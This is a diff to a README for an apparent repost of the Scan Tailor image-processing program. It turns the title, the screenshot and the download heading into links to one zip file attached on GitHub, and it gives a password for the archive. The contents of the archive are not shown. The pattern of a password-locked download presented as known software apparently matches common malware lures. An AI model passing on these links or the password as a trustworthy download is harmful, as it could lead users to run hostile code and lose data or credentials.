@@ -1,6 +1,6 @@
-# Scan-Tailor-v0.9.11.1-2012
+# [Scan-Tailor-v0.9.11.1-2012](https://github.com/user-attachments/files/18383542/Scan-Tailor-v0.9.11.1.zip)
 
-![image](https://github.com/user-attachments/assets/b967713b-aa32-4239-8605-effb4b713498)
+[![image](https://github.com/user-attachments/assets/b967713b-aa32-4239-8605-effb4b713498)](https://github.com/user-attachments/files/18383542/Scan-Tailor-v0.9.11.1.zip)
 
 **Scan Tailor** is an image processing program for **Windows**. With it, you can easily and efficiently convert scanned **books, magazines, documents, and other materials** into clean and readable **PDF files**.
 
@@ -17,5 +17,5 @@
 
 **Scan Tailor** is a useful program for processing **scanned images**. With it, you can easily and efficiently convert scans of **books, magazines, documents**, and **other materials** into clean and readable **PDF files**. You can perform various operations on **scans**, work with **multiple scans simultaneously** in batch **processing mode**, and export your scans to **various formats**.
 
-## Download Scan Tailor 0.9.11.1
+## [Download Scan Tailor 0.9.11.1](https://github.com/user-attachments/files/18383542/Scan-Tailor-v0.9.11.1.zip)
 ### Pass: HajerHammami
